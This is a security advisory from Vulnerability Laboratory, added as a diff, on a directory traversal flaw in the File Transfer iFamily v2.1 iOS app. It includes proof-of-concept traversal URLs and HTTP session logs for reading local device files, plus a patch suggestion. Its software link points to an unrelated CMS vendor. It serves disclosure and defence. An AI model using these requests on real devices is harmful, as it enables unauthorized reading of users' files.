@@ -1,0 +1,245 @@
+# Title: File Transfer iFamily 2.1 - Directory Traversal
+# Author: Vulnerability Laboratory
+# Date: 2020-04-15
+# Software Link: http://www.dedecms.com/products/dedecms/downloads/
+# CVE: N/A
+
+Document Title:
+===============
+File Transfer iFamily v2.1 - Directory Traversal Vulnerability
+
+
+References (Source):
+====================
+https://www.vulnerability-lab.com/get_content.php?id=2199
+
+
+Release Date:
+=============
+2020-04-14
+
+
+Vulnerability Laboratory ID (VL-ID):
+====================================
+2199
+
+
+Common Vulnerability Scoring System:
+====================================
+7.1
+
+
+Vulnerability Class:
+====================
+Directory- or Path-Traversal
+
+
+Current Estimated Price:
+========================
+1.000€ - 2.000€
+
+
+Product & Service Introduction:
+===============================
+Send photos, videos and documents to other devices without Internet. A
+complete application to exchange files
+wirelessly between devices. It uses the Multipeer Connectivity Framework
+to search and connect to available devices,
+without the need of internet connection or any kind of server and database.
+
+(Copy of the Homepage:
+https://apps.apple.com/us/app/file-transfer-ifamily-files-photo-video-documents-wifi/id957971575
+)
+
+
+Abstract Advisory Information:
+==============================
+The vulnerability laboratory core research team discovered a directory
+traversal web vulnerability in the official File Transfer iFamily v2.1
+ios mobile application.
+
+
+Affected Product(s):
+====================
+DONG JOO CHO
+Product: File Transfer iFamily v2.1 - iOS Mobile Web Application
+
+
+Vulnerability Disclosure Timeline:
+==================================
+2020-04-14: Public Disclosure (Vulnerability Laboratory)
+
+
+Discovery Status:
+=================
+Published
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+Severity Level:
+===============
+High
+
+
+Authentication Type:
+====================
+Pre auth - no privileges
+
+
+User Interaction:
+=================
+No User Interaction
+
+
+Disclosure Type:
+================
+Independent Security Research
+
+
+Technical Details & Description:
+================================
+A directory traversal web vulnerability has been discovered in the
+official File Transfer iFamily v2.1 ios mobile application.
+The vulnerability allows remote attackers to change the application path
+in performed requests to compromise the local application
+or file-system of a mobile device. Attackers are for example able to
+request environment variables or a sensitive system path.
+
+The directory-traversal web vulnerability is located in the main
+application path request performed via GET method. Attackers are
+able to request for example the local ./etc/ path of the web-server by
+changing the local path in the performed request itself.
+In a first request the attack changes the path, the host redirects to
+complete the adress with "..". Then the attacker just
+attaches a final slash to its request and the path can be accessed via
+web-browser to download local files.
+
+Exploitation of the directory traversal web vulnerability requires no
+privileged web-application user account or user interaction.
+Successful exploitation of the vulnerability results in information
+leaking by unauthorized file access and mobile application compromise.
+
+
+Proof of Concept (PoC):
+=======================
+The directory traversal vulnerability can be exploited by attackers with
+access to the wifi interface in a local network without user interaction.
+For security demonstration or to reproduce the security vulnerability
+follow the provided information and steps below to continue.
+
+
+PoC: Exploitation
+http://localhost/../../../../../../../../../../../../../../../../../../../../../../
+http://localhost//../
+
+
+--- PoC Session Logs [GET]] ---
+http://localhost/../../../../../../../../../../../../../../../../../../../../../../
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0)
+Gecko/20100101 Firefox/75.0
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+-
+GET: HTTP/1.1 200 OK
+Accept-Ranges: bytes
+Content-Length: 2521
+-
+http://localhost../etc/
+Host: localhost..
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0)
+Gecko/20100101 Firefox/75.0
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+- add slash to correct host adress (/.././)
+http://localhost/./
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0)
+Gecko/20100101 Firefox/75.0
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+- Access granted
+http://localhost/../../../../../../../../../../../../../../../../../../../../../../
+GET: HTTP/1.1 200 OK
+Accept-Ranges: bytes
+Content-Length: 2521
+
+
+Solution - Fix & Patch:
+=======================
+The vulnerability can be patched by a restriction of the visible and
+accessable ./etc/ path in the app container.
+Disallow path changes in the client-side get method requests and
+validate them securely.
+
+
+Security Risk:
+==============
+The security risk of the directory travsersal web vulnerability in the
+ios mobile application is estimated as high.
+
+
+Credits & Authors:
+==================
+Vulnerability-Lab -
+https://www.vulnerability-lab.com/show.php?user=Vulnerability-Lab
+Benjamin Kunz Mejri -
+https://www.vulnerability-lab.com/show.php?user=Benjamin%20K.M.
+
+
+Disclaimer & Information:
+=========================
+The information provided in this advisory is provided as it is without
+any warranty. Vulnerability Lab disclaims all warranties,
+either expressed or implied, including the warranties of merchantability
+and capability for a particular purpose. Vulnerability-Lab
+or its suppliers are not liable in any case of damage, including direct,
+indirect, incidental, consequential loss of business profits
+or special damages, even if Vulnerability-Lab or its suppliers have been
+advised of the possibility of such damages. Some states do
+not allow the exclusion or limitation of liability for consequential or
+incidental damages so the foregoing limitation may not apply.
+We do not approve or encourage anybody to break any licenses, policies,
+deface websites, hack into databases or trade with stolen data.
+
+Domains:    www.vulnerability-lab.com		www.vuln-lab.com			
+www.vulnerability-db.com
+Services:   magazine.vulnerability-lab.com
+paste.vulnerability-db.com 			infosec.vulnerability-db.com
+Social:	    twitter.com/vuln_lab		facebook.com/VulnerabilityLab 		
+youtube.com/user/vulnerability0lab
+Feeds:	    vulnerability-lab.com/rss/rss.php
+vulnerability-lab.com/rss/rss_upcoming.php
+vulnerability-lab.com/rss/rss_news.php
+Programs:   vulnerability-lab.com/submit.php
+vulnerability-lab.com/register.php
+vulnerability-lab.com/list-of-bug-bounty-programs.php
+
+Any modified copy or reproduction, including partially usages, of this
+file requires authorization from Vulnerability Laboratory.
+Permission to electronically redistribute this alert in its unmodified
+form is granted. All other rights, including the use of other
+media, are reserved by Vulnerability-Lab Research Team or its suppliers.
+All pictures, texts, advisories, source code, videos and other
+information on this website is trademark of vulnerability-lab team & the
+specific authors or managers. To record, list, modify, use or
+edit our material contact (admin@ or research@) to get a ask permission.
+
+				    Copyright © 2020 | Vulnerability Laboratory - [Evolution
+Security GmbH]™
